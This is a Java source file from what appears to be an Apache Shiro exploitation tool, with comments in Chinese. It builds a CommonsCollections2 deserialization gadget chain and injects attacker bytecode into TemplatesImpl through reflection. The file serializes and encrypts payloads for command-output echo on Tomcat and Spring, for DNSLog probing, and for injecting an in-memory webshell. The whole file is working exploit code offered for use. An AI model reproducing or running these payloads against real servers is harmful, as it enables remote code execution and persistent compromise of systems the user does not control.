package com.y5neko.shiroexp.gadget;

import com.y5neko.shiroexp.echo.*;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.y5neko.shiroexp.misc.Tools;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

/**
 * CommonsCollections2 利用链
 * 依赖: commons-collections4:4.0
 * 触发: PriorityQueue.readObject() -> TransformingComparator.compare() -> InvokerTransformer.transform()
 */
public class CommonsCollections2 {

    /**
     * 反射设置字段值
     */
    private static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    /**
     * 反射获取字段值
     */
    private static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    /**
     * 构造CC2链payload
     * @param clazzBytes 恶意类字节码
     * @return 反序列化payload
     */
    public byte[] getPayload(byte[] clazzBytes) throws Exception {
        // 创建TemplatesImpl对象并设置恶意字节码
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_bytecodes", new byte[][]{clazzBytes});
        setFieldValue(templates, "_name", "a");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        // 创建InvokerTransformer，初始方法为toString（无害方法）
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // 创建TransformingComparator包装transformer
        TransformingComparator comparator = new TransformingComparator(transformer);

        // 创建PriorityQueue并设置comparator
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

        // 添加两个元素触发排序
        queue.add(1);
        queue.add(1);

        // 通过反射修改InvokerTransformer的iMethodName为newTransformer
        setFieldValue(transformer, "iMethodName", "newTransformer");

        // 通过反射修改queue内部数组，将第一个元素替换为templates
        Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.close();

        return baos.toByteArray();
    }

    /**
     * 生成回显payload
     * @param echoType 回显类型
     * @return 加密后的payload字符串
     */
    public static String genEchoPayload(String echoType, String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        if (echoType.equals("TomcatEcho")) {
            TomcatEcho tomcatEcho = new TomcatEcho();
            ctClass = tomcatEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            return Tools.CBC_Encrypt(key, data);

        } else if (echoType.equals("SpringEcho")) {
            SpringEcho springEcho = new SpringEcho();
            ctClass = springEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            return Tools.CBC_Encrypt(key, data);

        } else if (echoType.equals("AllEcho")) {
            AllEcho allEcho = new AllEcho();
            ctClass = allEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            return Tools.CBC_Encrypt(key, data);

        } else if (echoType.equals("DNSLogEcho")) {
            // DNSLog 探测
            DNSLogEcho dnsLogEcho = new DNSLogEcho();
            ctClass = dnsLogEcho.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            return Tools.CBC_Encrypt(key, data);

        } else if (echoType.equals("DNSLogEchoSpring")) {
            // DNSLog 探测（Spring 版本）
            DNSLogEchoSpring dnsLogEchoSpring = new DNSLogEchoSpring();
            ctClass = dnsLogEchoSpring.genPayload(pool);

            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
                superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            } else {
                superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            }
            ctClass.setSuperclass(superClass);

            byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
            String data = Base64.getEncoder().encodeToString(payload);
            return Tools.CBC_Encrypt(key, data);

        } else {
            throw new Exception("不支持的回显类型: " + echoType);
        }
    }

    /**
     * 生成内存马payload
     * @return 加密后的payload字符串
     */
    public static String genMemPayload(String key) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass;
        CtClass superClass;

        // 使用 MemInject 作为内存马注入器
        MemInject memInject = new MemInject();
        ctClass = memInject.genPayload(pool);

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))){
            superClass = pool.get("org.apache.xalan.xsltc.runtime.AbstractTranslet");
        } else {
            superClass = pool.getCtClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        }
        ctClass.setSuperclass(superClass);

        byte[] payload = new CommonsCollections2().getPayload(ctClass.toBytecode());
        String data = Base64.getEncoder().encodeToString(payload);
        return Tools.CBC_Encrypt(key, data);
    }
}
